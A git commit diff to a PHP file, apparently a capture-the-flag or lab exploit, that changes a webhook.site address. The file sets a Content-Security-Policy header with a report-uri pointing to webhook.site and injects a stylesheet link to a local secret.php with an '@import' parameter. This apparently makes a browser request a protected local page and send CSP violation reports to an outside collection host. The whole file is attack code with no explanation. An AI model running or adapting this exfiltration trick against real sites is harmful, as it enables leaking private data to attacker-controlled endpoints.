c0941d346782fa46e4ac798f8c3328ac04a1fff8
tadokun468 <huynhluc258@gmail.com>
2024-12-09 13:00:27 +0700

    a

--- src/index.php
+++ src/index.php
@@ -1,5 +1,5 @@
 <?php
-header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/04b72cbe-5308-4e5c-9930-11d0629c7ee9;");
+header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/8f452ad6-8c24-4930-82ea-bce7fa34b379;");
 echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
 ?>
 
